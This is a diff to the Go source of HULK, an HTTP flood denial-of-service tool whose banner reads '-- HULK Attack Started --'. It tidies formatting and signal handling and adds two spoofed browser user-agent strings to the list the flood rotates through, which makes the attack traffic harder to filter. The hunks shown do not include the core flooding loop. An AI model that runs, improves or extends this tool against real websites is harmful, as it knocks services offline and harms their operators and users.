@@ -23,13 +23,13 @@ import (
 	"syscall"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -59,6 +59,8 @@ var (
 		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
 		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
 		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+		"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.22 Version/10.51",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.1",
 	}
 	cur int32
 )
@@ -99,7 +101,7 @@ func main() {
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+		fmt.Print("err parsing url parameter\n")
 		os.Exit(1)
 	}
 
@@ -124,7 +126,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		fmt.Print("-- HULK Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -154,11 +156,11 @@ func main() {
 			}
 		}
 	}()
-
-	ctlc := make(chan os.Signal)
-	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
-	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt)
+	signal.Notify(sig, syscall.SIGTERM)
+	<-sig
+	fmt.Print("\r\n-- Interrupted by user --        \n")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
